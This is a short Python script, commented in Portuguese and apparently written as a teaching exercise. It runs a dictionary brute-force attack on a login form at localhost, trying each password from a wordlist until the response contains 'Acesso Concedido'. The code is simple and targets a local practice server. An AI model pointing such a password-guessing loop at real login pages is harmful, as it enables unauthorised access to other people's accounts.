import requests 

# O alvo
url_alvo = "http://127.0.0.1:5000"

username = "admin"

wordlist_file = "wordlist.txt"

print("-" * 50)
print("       Simulador de Brute Force        ")
print("-" * 50)
print(f"Alvo: {url_alvo}")
print(f"Wordlist: {wordlist_file}\n")

def tentar_senhas():
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            for senha in file:
                senha = senha.strip()
                
                if not senha:
                    continue
                
                print(f"[?] Tentando senha: {senha}")

                dados_do_formulario = {
                    'password': senha
                }
                
                # 1. Fazer a requisição POST para a URL de login
                try:
                    response = requests.post(url_alvo, data=dados_do_formulario, timeout=5)
                except requests.exceptions.ConnectionError:
                    print("\n[ERRO] Não foi possível conectar ao servidor.")
                    print("Você iniciou o 'servidor_local.py' primeiro?")
                    return
                except requests.exceptions.Timeout:
                    print(f"\n[AVISO] Timeout ao tentar senha: {senha}")
                    continue

                # 2. Verificar a resposta do servidor
                if "Acesso Concedido" in response.text:
                    print("\n" + "=" * 50)
                    print(f"🎉 SENHA ENCONTRADA: {senha}")
                    print("=" * 50)
                    return 

        print("\n[!] Scan concluído. Senha não encontrada na lista.")

    except FileNotFoundError:
        print(f"\n[ERRO] Arquivo '{wordlist_file}' não encontrado.")
        print("Crie um arquivo 'wordlist.txt' na mesma pasta.")
    except Exception as e:
        print(f"\nOcorreu um erro: {e}")

tentar_senhas()